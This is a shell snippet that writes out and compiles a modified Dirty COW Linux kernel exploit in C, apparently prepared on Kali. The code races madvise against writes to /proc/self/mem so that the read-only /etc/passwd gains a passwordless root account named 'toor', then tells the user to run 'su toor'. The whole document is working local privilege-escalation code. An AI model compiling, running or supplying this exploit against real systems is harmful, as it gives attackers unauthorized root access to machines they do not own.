# On Kali — download and modify dirty.c to add a timeout
cat > /tmp/dirty_light.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <crypt.h>

void *map;
int f;
struct stat st;
int stop = 0;

void *madviseThread(void *arg){
    int i=0;
    for(i=0;i<300;i++){  // LIMITED iterations - won't freeze
        madvise(map,st.st_size,MADV_DONTNEED);
        usleep(1000);    // sleep between attempts
    }
    stop=1;
    return NULL;
}

void *procselfmemThread(void *arg){
    char *str = (char*)arg;
    int f=open("/proc/self/mem",O_RDWR);
    int i=0;
    for(i=0;i<300&&stop==0;i++){  // LIMITED iterations
        lseek(f,(uintptr_t)map,SEEK_SET);
        write(f,str,strlen(str));
        usleep(1000);    // sleep between attempts
    }
    close(f);
    return NULL;
}

int main(int argc,char *argv[]){
    char *newline;
    pthread_t pth1,pth2;

    // backup passwd first
    system("cp /etc/passwd /tmp/passwd.bak");
    printf("/etc/passwd backed up to /tmp/passwd.bak\n");

    f=open("/etc/passwd",O_RDONLY);
    fstat(f,&st);
    map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);
    printf("mmap: %lx\n",(unsigned long)map);

    // add toor:password as root user
    newline="toor::0:0:pwned:/root:/bin/bash\n";
    printf("Attempting to add: %s\n",newline);

    pthread_create(&pth1,NULL,madviseThread,NULL);
    pthread_create(&pth2,NULL,procselfmemThread,newline);
    pthread_join(pth1,NULL);
    pthread_join(pth2,NULL);

    // check if it worked
    if(system("grep toor /etc/passwd") == 0){
        printf("\ndone! run: su toor (no password needed)\n");
    } else {
        printf("\nnot done yet, try again\n");
    }
    return 0;
}
EOF

gcc -pthread -static /tmp/dirty_light.c -o /tmp/dirty_light -lcrypt
